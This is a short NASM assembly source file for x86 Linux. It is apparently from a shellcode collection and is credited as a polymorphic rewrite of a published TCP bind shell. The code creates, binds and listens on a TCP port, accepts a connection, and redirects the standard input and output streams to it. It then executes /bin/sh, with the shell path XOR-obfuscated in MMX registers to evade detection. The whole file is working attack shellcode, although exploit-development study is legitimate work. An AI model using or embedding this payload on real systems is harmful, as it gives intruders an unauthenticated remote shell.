; Filename: mmxTcpBindShell.nasm
; Author:   boku
; Polymorphic Version of Russell Willis's tcpbindshell  (108 bytes)
; original: http://shell-storm.org/shellcode/files/shellcode-847.php

global _start
_start:
 xor	ecx,ecx   ; Makes the ECX Register 0
 mul	ecx       ; ECX*EAX. Result is stored in EDX:EAX. 
                  ;  This clears the EDX and EAX.
 mov ebx, eax     ; sets the EBX register to 0
 push byte 0x66
 pop edi          ; save this for the other functions
 mov eax, edi	  ; eax is now 0x66 which is the socketcall SYScal
 inc ebx          ; EBX = 1; needed to create the socket()
 push edx
push   0x6
 push ebx         ; push 0x1 to the stack 
push   0x2
mov    ecx,esp
int    0x80       ; System Call
 xchg esi,eax     ; Save the output of the syscal to the ESI register
 mov eax, edi     ; EAX = 0x66 used for socketcall SYSCAL
 inc ebx          ; EBX = 0x2
push   edx
push word 0x697a  ; port TCP 
push   bx
mov    ecx,esp
push   0x10
push   ecx
push   esi
mov    ecx,esp
int    0x80       ; System Call
 mov eax, edi     ; EAX = 0x66 used for socketcall SYSCAL
 inc ebx
 inc ebx          ; EBX = 0x4
push   0x1
push   esi
mov    ecx,esp
int    0x80       ; System Call
 mov eax, edi     ; EAX = 0x66 used for socketcall SYSCAL
 inc ebx
push   edx
push   edx
push   esi
mov    ecx,esp
int    0x80       ; System Call
; setup dup2 loop
mov    ebx,eax
xor    ecx,ecx
mov    cl,0x3
; dup2
dup2Loop:
	dec ecx
mov    al,0x3f
int    0x80       ; System Call
jne    dup2Loop
push   edx
 mov edx, 0xffffffff     ; used to XOR the MM0 Register to result in "//bin/sh"
 mov eax, 0x978cd091     ; "n/sh" XOR'd with 0xffffffff
 movd mm0, eax
 psllq mm0, 32           ; shift the mm0 register left by 4 bytes
 mov ebx, 0x969dd0d0     ; "//bi" XOR'd with 0xffffffff
 movd mm1, ebx
 paddb mm0, mm1          ; now mm0 hold the 8 byte XOR'd "//bin/sh"
 movd mm1, edx           ; mm1 is now 0xffffffff
 psllq mm1, 32           ; mm1 is now 0xffffffff00000000
 movd mm2, edx           ; mm2 us biw 0xffffffff
 paddb mm1, mm2          ; mm1 is now 0xffffffffffffffff
 pxor mm0, mm1           ; XOR's mm0 with mm1 and saves the results in mm0
 sub esp, 8              ; Decrement the stack 8 bytes
 movq qword [esp], mm0   ; push "//bin/sh" from mm0 to the top of the stack
xor    eax,eax
mov    ebx,esp
push   eax
push   ebx
mov    ecx,esp
push   eax
mov    edx,esp
mov    al,0xb
int    0x80       ; System Call
